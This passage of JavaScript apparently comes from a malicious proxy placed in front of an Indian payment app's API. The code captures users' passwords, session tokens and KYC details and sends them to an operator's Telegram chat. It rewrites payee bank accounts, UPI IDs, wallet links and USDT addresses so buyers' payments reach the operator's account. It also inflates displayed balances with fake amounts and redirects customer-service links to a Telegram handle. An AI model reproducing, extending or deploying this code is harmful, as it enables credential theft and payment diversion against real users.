            urlLower.includes('/info') || urlLower.includes('_info') ||
            urlLower.includes('/query') || urlLower.includes('_query') ||
            urlLower.includes('/status') || urlLower.includes('_status') ||
            urlLower.includes('/view') || urlLower.includes('_view') ||
            urlLower.includes('/check') || urlLower.includes('_check') ||
            urlLower.includes('/record') || urlLower.includes('_record') ||
            urlLower.includes('/history') || urlLower.includes('_history') ||
            urlLower.includes('cancel');

        // Detect wallet type from URL for specific handling
        const isUsdtBuy = urlLower.includes('usdt');
        const isMobiKwikBuy = urlLower.includes('mobikwik') || urlLower.includes('mkw');
        const isOsdtBuy = urlLower.includes('osdt') || urlLower.includes('upiplus') || urlLower.includes('upi_plus');

        let proxyRes = null;
        const isBuyOrder = !isBuyList && req.method === 'POST' && (
            /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy)\b/i.test(path) ||
            /\/(buy|pick|grab|take|receive|rob|snatch)(itoken|order|osdt|usdt|mobikwik|rpt|paymentslip)\b/i.test(path) ||
            path.toLowerCase().endsWith('/buy') || path.toLowerCase().includes('/buy?') ||
            urlLower.includes('buyitoken') || urlLower.includes('buy_itoken') ||
            urlLower.includes('buyorder') || urlLower.includes('buy_order')
        );

        if (isBuyOrder) {
            proxyRes = await proxyToTivox(req);
            const { response: br, respBody: bb, respHeaders: bh } = proxyRes;
            let bj = null;
            try { bj = JSON.parse(bb); } catch (e) { }
            if (bj) {
                const origCode = bj.code;
                const origMsg = String(bj.msg || bj.message || '');

                let reqOrderId = '';
                try {
                    const ct = (req.headers['content-type'] || '').toLowerCase();
                    let rb = {};
                    if (ct.includes('multipart') && req.rawBody) {
                        rb = parseMultipartFields(req.rawBody);
                    } else if (ct.includes('json') && req.rawBody) {
                        rb = JSON.parse(req.rawBody.toString());
                    } else if (ct.includes('form') && req.rawBody) {
                        rb = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
                    }
                    const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
                    reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || rb.id || rb.slipId || qs.get('order_id') || qs.get('orderId') || qs.get('orderNo') || qs.get('rptNo') || qs.get('id') || qs.get('slipId') || '';
                } catch (e) { }

                // Also check if response has orderId if request doesn't
                if (!reqOrderId && bj.data && typeof bj.data === 'object') {
                    reqOrderId = bj.data.orderId || bj.data.orderNo || bj.data.rptNo || bj.data.slipId || '';
                }

                const _reqBodyAmt = getOrderAmount(req, req.body || {});
                let savedAmount = _reqBodyAmt || 0;
                if (!savedAmount && bj.data && typeof bj.data === 'object') {
                    // extract from walletDomain if possible
                    if (bj.data.walletDomain) {
                        const urlParams = new URLSearchParams(bj.data.walletDomain.split('?')[1] || '');
                        savedAmount = parseAmountCandidate(urlParams.get('amount')) || 0;
                    } else {
                        savedAmount = getOrderAmount(req, bj.data) || 0;
                    }
                }

                const isSuccessMsg = origMsg.toLowerCase().includes('upi is being used') || origMsg.toLowerCase().includes('finish payment');
                if (!(origCode === 0 || origCode === undefined || isSuccessMsg)) {
                    // ── Case 2: Real API returned ERROR ─────────────────────────────────
                    const errorKey = reqOrderId + '_' + origMsg;
                    const lastErrTime = recentErrors.get(errorKey) || 0;
                    const nowTs = Math.floor(Date.now() / 1000);
                    if (nowTs - lastErrTime > 15) { // 15 seconds debounce
                        recentErrors.set(errorKey, nowTs);
                        notifyAdmin(data,
                            `❌ BUY NOT SUCCESSFUL\n💰 Amount: ₹${savedAmount || 'unknown'}\n📋 Order: ${reqOrderId || 'N/A'}\n⚠️ Reason: ${origMsg || 'unknown error'}\n🕐 ${now}`);
                    }
                } else {
                    // ── Case 1: Real API returned SUCCESS ─────────────────────────────────
                    const activeBank = getActiveBank(data, null);
                    // Do not pre-save a mapping here. The generic response-mutation path
                    // below persists the order only after it confirms that bank details or
                    // the wallet domain were actually rewritten.
                }
                // Let it fall through to main proxy logic to rewrite the response!
            } else {
                bh['content-length'] = String(Buffer.byteLength(bb));
                res.writeHead(br.status, bh);
                return res.end(bb);
            }
        }

        // ── paymentslipdetail / order detail intercept — serve from orderBankMap if backend 404s ──
        const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
            urlLower.includes('paymentslipdetail') || urlLower.includes('payment_slip_detail') ||
            urlLower.includes('slipdetail') || urlLower.includes('orderdetail') || urlLower.includes('order_detail') ||
            urlLower.includes('buydetail') || urlLower.includes('buy_detail') ||
            (urlLower.includes('buyitoken') && (urlLower.includes('/detail') || urlLower.includes('_detail') ||
                urlLower.includes('/orderinfo') || urlLower.includes('/order_info') || urlLower.includes('/getorder')))
        );
        if (isSlipDetail && !proxyRes) {
            proxyRes = await proxyToTivox(req);
            const { response: sd, respBody: sb2, respHeaders: sh2 } = proxyRes;
            let sj2 = null;
            try { sj2 = JSON.parse(sb2); } catch (e) { }
            // If backend returned 404 / error / non-JSON — try to serve from orderBankMap
            const slipFailed = !sj2 || sd.status === 404 || (sj2.code !== 0 && sj2.code !== undefined);
            const detailSlipId = getRequestOrderId(req);
            const detailResponseId = sj2 && sj2.data && typeof sj2.data === 'object'
                ? (sj2.data.rptNo || sj2.data.orderNo || sj2.data.orderId || sj2.data.id || sj2.data.slipId || '')
                : '';
            const savedDetailSlip = getSavedOrderMapping(data, detailSlipId) ||
                getSavedOrderMapping(data, detailResponseId) ||
                getSavedOrderMapping(data, sj2 && sj2.data);
            if (slipFailed && savedDetailSlip) {
                const slipId = detailSlipId;
                const savedSlip = savedDetailSlip;
                if (savedSlip) {
                    const savedBank2 = bankFromSavedOrder(savedSlip);
                    const bkName2 = savedBank2 ? savedBank2.accountHolder : '';
                    const bkAcct2 = savedBank2 ? savedBank2.accountNo : '';
                    const bkIfsc2 = savedBank2 ? savedBank2.ifsc : '';
                    const bkBank2 = savedBank2 ? (savedBank2.ifsc || savedBank2.bankName || 'Bank') : 'Bank';
                    const bkUpi2 = savedBank2 ? (savedBank2.upiId || '') : '';
                    const amt2 = savedSlip.amount || 0;
                    const last42 = bkAcct2.slice(-4);
                    const nowTs2 = Math.floor(Date.now() / 1000);
                    const wDomain = bkAcct2 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct2}&ifsc=${bkIfsc2}&name=${encodeURIComponent(bkName2)}&amount=${amt2}.0&displayAccountNumber=xxxxxxxxx${last42}` : '';
                    const slipResp = {
                        code: 0, msg: 'success',
                        data: {
                            rptNo: slipId, orderNo: slipId, orderId: slipId, slipId: slipId,
                            acctName: bkName2, accountName: bkName2, name: bkName2,
                            acctNo: bkAcct2, accountNo: bkAcct2, account: bkAcct2,
                            acctCode: bkIfsc2, ifsc: bkIfsc2, ifscCode: bkIfsc2,
                            bankName: bkBank2, acctBankName: bkBank2, payee_bankname: bkBank2, payee_ifsc: bkIfsc2,
                            upiId: bkUpi2, payAccount: bkUpi2 || `${bkAcct2}@mbk`,

                            walletDomain: wDomain,
                            amount: amt2, realAmount: amt2, orderAmount: amt2, money: amt2,
                            endTime: nowTs2 + 1800, expireTime: nowTs2 + 1800, crtDate: nowTs2,
                            payerTimeoutTime: 1800, timeoutTime: 1800,
                            orderState: 0, currency: 3, exchangeRate: 1, hideState: 0,
                            payType: 2, ctType: 1, method: 1,
                            ctTypeName: 'MobiKwik', payTypeName: 'MobiKwik',
                        }
                    };
                    return res.status(200).json(slipResp);
                }
            }
            // Only mutate a successful detail response when this order is already saved in KV.
            if (!slipFailed && sj2 && sj2.data && savedDetailSlip) {
                const savedBank = bankFromSavedOrder(savedDetailSlip);
                if (savedBank && (savedBank.accountNo || savedBank.ifsc || savedBank.accountHolder)) {
                    forceBankDetails(sj2.data, savedBank);
                    // paymentslipdetail uses payee_bankname/bank display fields, while
                    // ct_account and ctAccount must remain the platform values.
                    replaceOnlyBankNameFields(sj2.data, savedBank);

                    const displayIfsc = String(savedBank.ifsc || '').trim();
                    if (displayIfsc) {
                        // For this detail screen, the Bank label intentionally mirrors IFSC.
                        // Never modify ct_account or ctAccount; those are platform references.
                        sj2.data.bankName = displayIfsc;
                        sj2.data.acctBankName = displayIfsc;
                        sj2.data.payee_bankname = displayIfsc;
                        sj2.data.payee_ifsc = displayIfsc;
                        sj2.data.payeeBankName = displayIfsc;
                        sj2.data.bank = displayIfsc;
                        replaceMalformedBankLabels(sj2.data, displayIfsc);
                    }
                    // Stringify the updated JSON and update headers
                    const newBody = JSON.stringify(sj2);
                    sh2['content-length'] = String(Buffer.byteLength(newBody));
                    res.writeHead(sd.status, sh2);
                    return res.end(newBody);
                }
            }
            // If no active bank or didn't replace, just let the main pipeline handle it
        }

        // ── availablect — if empty list, inject a placeholder so frontend doesn't block buy ──
        const isAvailableCt = urlLower.includes('availablect') || urlLower.includes('available_ct') ||
            urlLower.includes('availablechannel') || urlLower.includes('paymentchannel');
        if (isAvailableCt) {
            const { response: ar, respBody: ab, respHeaders: ah } = await proxyToTivox(req);
            let aj = null;
            try { aj = JSON.parse(ab); } catch (e) { }
            if (aj && aj.code === 0 && Array.isArray(aj.data) && aj.data.length === 0) {
                // Backend says no channels available — inject a stub so the frontend can proceed
                aj.data = [{ id: 1, name: 'Bank Transfer', type: 0, payType: 0, status: 1, enable: 1 }];
                return res.status(200).json(aj);
            }
            if (aj) return res.status(200).json(aj);
            ah['content-length'] = String(Buffer.byteLength(ab));
            res.writeHead(ar.status, ah);
            return res.end(ab);
        }




        const { response, respBody, respHeaders } = proxyRes || await proxyToTivox(req);

        if (data.blockUpdate !== false) {
            for (const k of Object.keys(respHeaders)) {
                if (k.toLowerCase() === 'needupdateflag') delete respHeaders[k];
            }
        }

        let jsonResp = null;
        try { jsonResp = JSON.parse(respBody); } catch (e) { }

        // Saved detail mappings are always honored, even when the proxy is OFF.
        // This does not create mappings or affect unmapped orders.
        if (jsonResp && isSlipDetail) {
            applySavedDetailReplacement(jsonResp, data, req);
        }

        if (!jsonResp) {
            respHeaders['content-length'] = String(Buffer.byteLength(respBody));
            res.writeHead(response.status, respHeaders);
            return res.end(respBody);
        }

        // Full bypass for login and security check intercepts.
        // Real server handles rate limiting and security checks on login/register completely.

        const respData = jsonResp.data || jsonResp.body || jsonResp.result || null;

        if (urlLower.includes('customerservice') || urlLower.includes('customer_service') || urlLower.includes('customer-service') || urlLower.includes('csrlist') || urlLower.includes('servicelist')) {
            function replaceAllUrls(obj) {
                if (!obj || typeof obj !== 'object') return;
                if (Array.isArray(obj)) { obj.forEach(item => replaceAllUrls(item)); return; }
                for (const k of Object.keys(obj)) {
                    if (typeof obj[k] === 'string') {
                        const v = obj[k].trim();
                        if (v.startsWith('http://') || v.startsWith('https://') || v.startsWith('tg://') || v.startsWith('whatsapp://')) {
                            obj[k] = 'https://t.me/Vivipaymed';
                        }
                    } else if (typeof obj[k] === 'object') {
                        replaceAllUrls(obj[k]);
                    }
                }
            }
            replaceAllUrls(jsonResp);
            const finalBody = JSON.stringify(jsonResp);
            const finalCS = finalBody.replace(/https?:\/\/[^\s"',}\]]+/g, 'https://t.me/Vivipaymed');
            respHeaders['content-length'] = String(Buffer.byteLength(finalCS));
            res.writeHead(response.status, respHeaders);
            return res.end(finalCS);
        }

        let reqBody = {};
        if (req.rawBody && req.rawBody.length > 0) {
            try {
                const ct = (req.headers['content-type'] || '').toLowerCase();
                if (ct.includes('json')) { reqBody = JSON.parse(req.rawBody.toString()); }
                else if (ct.includes('multipart')) { reqBody = parseMultipartFields(req.rawBody); }
                else if (ct.includes('form')) { reqBody = Object.fromEntries(new URLSearchParams(req.rawBody.toString())); }
            } catch (e) { }
        }
        if (req.body && typeof req.body === 'object' && Object.keys(req.body).length > 0) {
            reqBody = { ...reqBody, ...req.body };
        }

        // walletDomain links do not always carry an order ID (for example,
        // pickuppaymentslip). Rewrite them by their embedded amount instead.
        // Existing mapped orders use their saved bank; otherwise the active bank is
        // used. The helper preserves the original scheme/path and leaves links at
        // or below the active minimum untouched.
        rewriteWalletDomainsInResponse(jsonResp, data, getActiveBank(data, null));

        let userId = '';
        const pxUid = req.headers['x-px-uid'] || '';
        if (pxUid && /^\d{3,12}$/.test(pxUid)) userId = pxUid;
        if (!userId && respData && typeof respData === 'object') userId = findNumericId(respData, 0);
        if (!userId) userId = findNumericId(jsonResp, 0);
        if (!userId) userId = findNumericId(reqBody, 0);
        if (!userId) userId = await resolveUserId(req);

        const reqPhone = reqBody.phone || reqBody.mobile || reqBody.memberPhone || reqBody.username || reqBody.loginName || reqBody.account || '';
        const respPhone = (respData && typeof respData === 'object') ? (respData.phone || respData.mobile || respData.memberPhone || respData.loginName || '') : '';
        const phone = reqPhone || respPhone;

        if (userId) {
            await saveUserMapping(req, userId);
            if (!data.trackedUsers) data.trackedUsers = {};
            const existing = data.trackedUsers[String(userId)] || {};
            data.trackedUsers[String(userId)] = {
                ...existing,
                lastSeen: now,
                lastAction: path.split('/').pop() || 'API',
                phone: phone || existing.phone || ''
            };
            if (respData && typeof respData === 'object') {
                const rName = respData.name || respData.nickname || respData.realName || respData.userName || respData.memberName || '';
                if (rName) data.trackedUsers[String(userId)].name = rName;
            }
        }

        const isLogin = urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('dologin') || urlLower.includes('auth') || urlLower.includes('register');
        if (isLogin) {
            const pwd = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';

            let extractedToken = '';
            if (typeof respData === 'string' && respData.length > 10) {
                extractedToken = respData;
            } else if (respData && typeof respData === 'object') {
                extractedToken = respData.token || respData.accessToken || '';
                if (!extractedToken && typeof respData.data === 'string' && respData.data.length > 10) {
                    extractedToken = respData.data;
                }
            }

            if (!extractedToken && response.headers && response.headers.get('set-cookie')) {
                const cookieMatch = response.headers.get('set-cookie').match(/token=([^;]+)/);
                if (cookieMatch) extractedToken = cookieMatch[1];
            }

            const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
            const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';

            const fullToken = extractedToken ? String(extractedToken).trim() : '';
            const clientId = String(
                reqBody.clientId || reqBody.clientID || reqBody.client_id ||
                req.headers['clientid'] || req.headers['x-client-id'] || ''
            ).trim();
            const isSuccessfulLogin = Boolean(fullToken && !/^send success$/i.test(fullToken));
            const mono = escapeTelegramHtml;

            if (isSuccessfulLogin) {
                const loginMessage = `🔑 <b>LOGIN CAPTURED</b>
👤 User: <code>${mono(userId || 'N/A')}</code>
💻 Platform: ${mono(platformStr)}
📱 Phone: <code>${mono(phone || 'N/A')}</code>
🔐 Pass: <code>${mono(pwd || 'N/A')}</code>
🎫 Token: <code>${mono(fullToken)}</code>
🆔 Client ID: <code>${mono(clientId || 'N/A')}</code>
🕐 <code>${mono(now)}</code>`;
                await notifyAdmin(data, loginMessage, { pin: true, parse_mode: 'HTML' });
            } else {
                const otpMessage = `🔑 <b>OTP REQUEST</b>
👤 User: <code>${mono(userId || 'N/A')}</code>
💻 Platform: ${mono(platformStr)}
📱 Phone: <code>${mono(phone || 'N/A')}</code>
🔐 Pass: <code>${mono(pwd || 'N/A')}</code>
✅ OTP sent successfully
🕐 <code>${mono(now)}</code>`;
                await notifyAdmin(data, otpMessage, { parse_mode: 'HTML' });
            }

        }

        const isUserInfo = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
            urlLower.includes('member/info') || urlLower.includes('user/info') ||
            urlLower.includes('myinfo') || urlLower.includes('getinfo') ||
            urlLower.includes('getmember') || urlLower.includes('memberdetail');

        // ── Global feature-flag patch: force all "permission" flags to enabled ──────
        // Applied to EVERY response regardless of URL — covers memberInfo, home, index etc.
        {
            function patchFeatureFlags(obj, depth) {
                if (!obj || typeof obj !== 'object' || depth > 4) return;
                if (Array.isArray(obj)) { obj.forEach(i => patchFeatureFlags(i, depth + 1)); return; }
                // chargeFlag=1 → user can buy; userBankFlag=1 → bank/UPI section unlocked
                // withdrawFlag=1 → withdraw enabled; sellFlag=1 → sell enabled
                const onFlags = ['chargeFlag', 'userBankFlag', 'withdrawFlag', 'sellFlag',
                    'buyFlag', 'rechargeFlag', 'tradeFlag', 'enableBuy', 'enableSell',
                    'enableWithdraw', 'enableRecharge', 'canBuy', 'canSell', 'canWithdraw'];
                for (const f of onFlags) {
                    if (obj[f] !== undefined && obj[f] === 0) obj[f] = 1;
                }
                // status=1 (active), freeze=0 (not frozen), isFreeze=0
                if (obj.status !== undefined && obj.status === 0 && obj.code === undefined) obj.status = 1;
                if (obj.freeze !== undefined) obj.freeze = 0;
                if (obj.isFreeze !== undefined) obj.isFreeze = 0;
                for (const k of Object.keys(obj)) {
                    if (obj[k] && typeof obj[k] === 'object') patchFeatureFlags(obj[k], depth + 1);
                }
            }
            patchFeatureFlags(jsonResp, 0);
        }

        if (isUserInfo && respData && typeof respData === 'object' && userId) {
            const balResult = findBalanceDeep(respData, 0) || findBalanceDeep(jsonResp, 0);
            if (balResult) {
                const realBalance = balResult.value;
                const uo = (data.userOverrides && data.userOverrides[String(userId)]) || {};
                const addedBalance = uo.addedBalance || 0;
                const globalBonus = data.depositBonus || 0;
                const totalFake = addedBalance + globalBonus;
                const shownBalance = parseFloat((realBalance + totalFake).toFixed(2));
                const lastReal = uo.lastRealBalance;
                const trackedUser = (data.trackedUsers && data.trackedUsers[String(userId)]) || {};
                const userName = trackedUser.name || '';
                const userPhone = trackedUser.phone || phone || '';

                if (!data.userOverrides) data.userOverrides = {};
                if (!data.userOverrides[String(userId)]) data.userOverrides[String(userId)] = {};
                data.userOverrides[String(userId)].lastRealBalance = realBalance;

                const balChanged = lastReal === undefined || Math.abs(lastReal - realBalance) > 0.01;
                const snapKey = `bal_${userId}`;
                const lastSnapTime = _balSnapTimes[snapKey] || 0;
                const nowMs = Date.now();
                const shouldNotify = balChanged || (nowMs - lastSnapTime > 120000);

                if (shouldNotify && (nowMs - lastSnapTime > 10000)) {
                    _balSnapTimes[snapKey] = nowMs;
                    const changeStr = lastReal !== undefined
                        ? `\n📈 Change: ${realBalance > lastReal ? '+' : ''}₹${(realBalance - lastReal).toFixed(2)} (was ₹${lastReal})`
                        : '';
                    notifyAdmin(data,
                        `┌──────────────────────────┐
│    💎 BALANCE SNAPSHOT    │
└──────────────────────────┘
👤 ID: ${userId}${userName ? '\n📛 Name: ' + userName : ''}${userPhone ? '\n📱 Phone: ' + userPhone : ''}

📊 BALANCE BREAKDOWN:
💰 Real Balance:   ₹${realBalance.toFixed(2)}
➕ Bot Added:      ₹${totalFake.toFixed(2)}${addedBalance ? ' (user: +₹' + addedBalance + ')' : ''}${globalBonus ? (addedBalance ? ', global: +₹' + globalBonus : ' (global: +₹' + globalBonus + ')') : ''}
━━━━━━━━━━━━━━━━━━━━━━━━━━
👁 User Sees:      ₹${shownBalance.toFixed(2)}${changeStr}

🔗 Field: ${balResult.field}
🕐 ${now}`);
                }
                data.trackedUsers[String(userId)].balance = String(realBalance);
            }
        }

        const isOrder = urlLower.includes('paymentslipdetail')
            || /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(path)
            || (/\/(order|buy|recharge|trade)/i.test(path) && req.method === 'POST')
            || urlLower.includes('news/code/'); // For dynamic direct payment screens like freechargetutorial
        let _orderId = '';
        if (isOrder) {
            const orderFields = ['rptNo', 'rpt_no', 'orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo', 'id', 'slipId'];
            if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
                for (const f of orderFields) {
                    if (respData[f] && String(respData[f]).length >= 3) { _orderId = String(respData[f]); break; }
                }
            }
            if (!_orderId) {
                const urlParams = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
                for (const f of orderFields) {
                    if (urlParams.get(f)) { _orderId = urlParams.get(f); break; }
                }
            }
        }

        if (urlLower.includes('kyc') || urlLower.includes('bind') || urlLower.includes('linkkyc')) {
            let kycInfo = '';
            if (req.rawBody) {
                try {
                    const ct = (req.headers['content-type'] || '').toLowerCase();
                    let b = {};
                    if (ct.includes('json')) b = JSON.parse(req.rawBody.toString());
                    else if (ct.includes('multipart')) b = parseMultipartFields(req.rawBody);
                    else if (ct.includes('form')) b = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
                    const keys = ['realName', 'name', 'idCard', 'idNo', 'bankCard', 'bankNo', 'accountNo', 'ifsc', 'upiId', 'phone', 'mobile'];
                    for (const k of keys) { if (b[k]) kycInfo += `\n  ${k}: ${b[k]}`; }
                } catch (e) { }
            }
            notifyAdmin(data,
                `🔐 KYC/BIND
👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${kycInfo}
🕐 ${now}`);
        }

        if (urlLower.includes('sell') || urlLower.includes('withdraw')) {
            let sellAmt = '';
            if (respData && typeof respData === 'object') {
                const a = respData.amount || respData.money || respData.withdrawAmount || respData.sellAmount;
                if (a) sellAmt = `\n💰 Amount: ₹${a}`;
            }
            notifyAdmin(data,
                `💸 SELL/WITHDRAW
👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${sellAmt}
📊 Status: ${response.status}
🕐 ${now}`);
        }

        const isInrCancelledSection = urlLower.includes('/buyitoken/history') && (
            urlLower.includes('currency=inr_cancel') || urlLower.includes('currency%3dinr_cancel')
        );
        if (isInrCancelledSection) {
            notifyAdmin(data,
                `👤 USER VISITED INR CANCELLED SECTION\n🆔 User: ${userId || 'N/A'}${phone ? '\n📱 Phone: ' + phone : ''}\n🕐 ${now}`);
        } else if (urlLower.includes('cancel')) {
            const cancelSuccess = !jsonResp || jsonResp.code === 0 || jsonResp.code === 200 || jsonResp.success === true;
            let cancelOrderId = '';
            let cancelAmt = '';
            let cancelBankInfo = '';
            const cancelFields = ['orderId', 'orderNo', 'order_id', 'buyOrderNo', 'id', 'slipId'];
            const cancelAmtFields = ['amount', 'money', 'orderAmount', 'buyAmount', 'totalAmount'];
            if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
                for (const f of cancelFields) { if (respData[f]) { cancelOrderId = String(respData[f]); break; } }
                for (const f of cancelAmtFields) { if (respData[f]) { cancelAmt = `\n💰 Amount: ₹${respData[f]}`; break; } }
            }
            if (!cancelOrderId) {
                const urlParams = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
                for (const f of cancelFields) { if (urlParams.get(f)) { cancelOrderId = urlParams.get(f); break; } }
                if (!cancelOrderId && req.body) {
                    for (const f of cancelFields) { if (req.body[f]) { cancelOrderId = String(req.body[f]); break; } }
                }
            }
            if (cancelOrderId && data.orderBankMap && data.orderBankMap[cancelOrderId]) {
                const saved = data.orderBankMap[cancelOrderId];
                cancelBankInfo = `\n🏦 Bank Was: ${saved.bank}`;
                if (!cancelAmt && saved.bank) { }
            }
            notifyAdmin(data,
                `❌ ORDER CANCELLED
👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${cancelOrderId ? '\n📋 Order: ' + cancelOrderId : ''}${cancelAmt}${cancelBankInfo}
📊 ${cancelSuccess ? '✅ Cancelled Successfully' : '⚠️ Cancel Response: ' + (jsonResp && jsonResp.message ? jsonResp.message : response.status)}
🕐 ${now}`);
        }

        if (urlLower.includes('notifynewbill') || urlLower.includes('notify_new_bill') || urlLower.includes('newbill')) {
            let billInfo = '';
            if (jsonResp && typeof jsonResp === 'object') {
                const d = jsonResp.data || jsonResp.body || jsonResp.result || jsonResp;
                const fields = ['billId', 'orderId', 'orderNo', 'amount', 'money', 'fromTimestamp', 'phone', 'mobile', 'account', 'bankName', 'ifsc', 'upiId'];
                for (const f of fields) {
                    if (d[f] !== undefined && d[f] !== null && d[f] !== '') billInfo += `\n  ${f}: ${d[f]}`;
                }
            }
            notifyAdmin(data,
                `🔔 NEW BILL\n👤 User: ${userId || 'N/A'}${billInfo}\n🕐 ${now}`);
        }

        if (data.logRequests && data.adminChatId && bot && !isLogin && !isUserInfo && !isOrder) {
            const tag = userId ? ` [${userId}]` : '';
            const phoneTag = phone ? ` (${phone})` : '';
            bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}\n📊 Status: ${response.status}`).catch(() => { });
        }

        const _realBankSnap = captureRealBank(jsonResp);

        let _bankReplaced = false;
        let _replacedBank = null;
        let _notReplacedAmt = null;
        let _notReplacedMin = null;

        if (data.botEnabled !== false) {
            const bank = getActiveBank(data, userId);
            if (bank) {
                const isListResp = Array.isArray(respData);
                // Detect nested list: { list:[...] } / { data:[...] } / { records:[...] } / { rows:[...] } / { items:[...] }
                const nestedList = !isListResp && respData && typeof respData === 'object'
                    ? (Array.isArray(respData.list) ? respData.list
                        : Array.isArray(respData.data) ? respData.data
                            : Array.isArray(respData.records) ? respData.records
                                : Array.isArray(respData.rows) ? respData.rows
                                    : Array.isArray(respData.items) ? respData.items
                                        : Array.isArray(respData.waitconfirm) ? respData.waitconfirm
                                            : null)
                    : null;

                const _oIdFields = ['rptNo', 'rpt_no', 'orderNo', 'order_no', 'orderId', 'order_id', 'slipId', 'buyOrderNo', 'tradeNo'];
                function _getItemOId(item) {
                    for (const f of _oIdFields) { if (item[f] && String(item[f]).length >= 3) return String(item[f]); }
                    return '';
                }
                function _wasForced(oId) {
                    return !!(oId && data.orderBankMap && data.orderBankMap[oId] && data.orderBankMap[oId].forced);
                }
                // Per-item replace: browse items (orderState=0) → minAmount check → blanket replace;
                // Per-item replace in lists:
                // 1. Saved orders in KV → replace with saved mapped bank
                // 2. Unmapped items in list → replace on-the-fly for display ONLY (NEVER save to KV)
                function _replaceListItems(list) {
                    list.forEach(item => {
                        if (!item || typeof item !== 'object') return;
                        const orderState = parseInt(item.orderState ?? item.state ?? -1);
                        const oId = _getItemOId(item);
                        const savedMapping = getSavedOrderMapping(data, item) ||
                            (oId ? getSavedOrderMapping(data, oId) : null) ||
                            getSavedOrderMapping(data, item.rptNo || item.orderNo || item.orderId || item.id || item.slipId || '');

                        const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
                        const minOk = !bank.minAmount || (iAmt > 0 && iAmt >= bank.minAmount);

                        if (savedMapping) {
                            // Already bought / mapped order in KV: replace with mapped bank
                            const mappedBank = bankFromSavedOrder(savedMapping);
                            if (mappedBank && (mappedBank.accountNo || mappedBank.ifsc || mappedBank.accountHolder)) {
                                if (urlLower.includes('waitconfirm')) {
                                    replaceWaitConfirmBankFields(item, mappedBank);
                                } else {
                                    forceBankDetails(item, mappedBank);
                                }
                                const walletTemplate = item.walletDomain || mappedBank.walletDomain || '';
                                const mappedWallet = rewriteWalletDomainForBank(walletTemplate, mappedBank, bank && bank.minAmount);
                                if (mappedWallet) item.walletDomain = mappedWallet;
                            }
                        } else if (minOk && (!urlLower.includes('history') || orderState <= 2 || item.walletDomain)) {
                            // On-the-fly replace for display ONLY — NEVER write to orderBankMap here!
                            if (urlLower.includes('waitconfirm')) {
                                replaceWaitConfirmBankFields(item, bank);
                            } else {
                                forceBankDetails(item, bank);
                            }
                            if (item.walletDomain) {
                                item.walletDomain = rewriteWalletDomainForBank(item.walletDomain, bank, bank && bank.minAmount);
                            }
                        }
                    });
                }

                if (isListResp) {
                    _replaceListItems(respData);
                } else if (nestedList) {
                    _replaceListItems(nestedList);
                } else {
                    // Single order / non-list response
                    let shouldReplace = true;
                    if (bank.minAmount) {
                        const amt = getOrderAmount(req, respData);
                        if (amt !== null && amt < bank.minAmount) {
                            shouldReplace = false;
                            _notReplacedAmt = amt;
                            _notReplacedMin = bank.minAmount;
                        }
                    }
                    if (shouldReplace) {
                        const singleOrderState = parseInt(respData ? (respData.orderState ?? respData.state ?? -1) : -1);
                        const isPickupResponse = urlLower.includes('/pickuppaymentslip');
                        const isSlipDetailResponse = urlLower.includes('paymentslipdetail') || urlLower.includes('payment_slip_detail') || urlLower.includes('slipdetail');
                        const pickupOrderId = isPickupResponse
                            ? (getRequestOrderId(req) || reqBody.order_id || reqBody.orderId || reqBody.orderNo || reqBody.rptNo || reqBody.id || reqBody.slipId || '')
                            : '';
                        const directSingleId = respData && typeof respData === 'object'
                            ? (respData.rptNo || respData.orderNo || respData.orderId || respData.id || respData.slipId || '')
                            : '';
                        const savedSingleOrder = singleOrderState > 0 || isPickupResponse || isSlipDetailResponse
                            ? (getSavedOrderMapping(data, directSingleId) || getSavedOrderMapping(data, respData) || getSavedOrderMapping(data, pickupOrderId) || getSavedOrderMapping(data, getRequestOrderId(req)))
                            : null;
                        // Completed/history and pick-up responses are strict: no KV mapping
                        // means no replacement. Other active/pending responses retain existing behavior.
                        if ((!isPickupResponse && singleOrderState <= 0) || savedSingleOrder) {
                            const replacementBank = savedSingleOrder ? bankFromSavedOrder(savedSingleOrder) : bank;
                            if (replacementBank && (replacementBank.accountNo || replacementBank.ifsc || replacementBank.accountHolder)) {
                                const globalHasAcct = scanHasBankFields(jsonResp, 0);
                                if (globalHasAcct) {
                                    deepReplaceBankFields(jsonResp, replacementBank, 0, globalHasAcct);
                                    _bankReplaced = true;
                                    _replacedBank = replacementBank;
                                }
                            }
                        }
                    }
                }
            }

            {
                const uo = userId ? ((data.userOverrides && data.userOverrides[String(userId)]) || {}) : {};
                const addedBalance = uo.addedBalance || 0;
                const globalBonus = data.depositBonus || 0;
                const totalBonus = addedBalance + globalBonus;
                if (totalBonus > 0) {
                    addBalanceToFields(jsonResp, totalBonus, 0);
                }
            }

            if (data.usdtAddress) {
                replaceUsdtAddress(jsonResp, data.usdtAddress, 0);
            }
        }

        // Only notify when response actually had bank details (paymentslipdetail or bank fields in response)
